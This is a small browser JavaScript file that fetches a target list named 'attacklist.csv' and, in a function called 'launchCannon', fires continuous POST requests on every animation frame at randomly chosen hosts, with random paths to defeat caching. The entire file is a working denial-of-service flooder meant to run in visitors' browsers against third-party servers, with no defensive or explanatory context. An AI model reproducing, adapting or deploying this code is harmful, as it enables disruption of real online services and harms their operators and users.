(function () {
  window.getTargets = function (cb) {
    fetch('/attacklist.csv').then(res => {
      res.text().then(list => {
        const targets = list.split("\n")
          .slice(1).filter(i => !!i)
          .map(i => {
            const row = i.split(',')
            return {
              host: row[0],
              port: row[1],
              path: row[2]
            }
          })
        cb(targets)
      })
    });
  }

  window.launchCannon = function () {
    getTargets(function (targets) {
      console.log(targets)

      function triggerRequest() {
        const target = targets[Math.floor(Math.random() * targets.length)];

        var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();
        console.log(target)
        fetch(`https://${target.host}:${target.port}${target.path}/${rand}`, {
          method: 'POST',
          options: 'no-cors',
        })
        requestAnimationFrame(triggerRequest)
      }

      triggerRequest()
    })
  }
})();
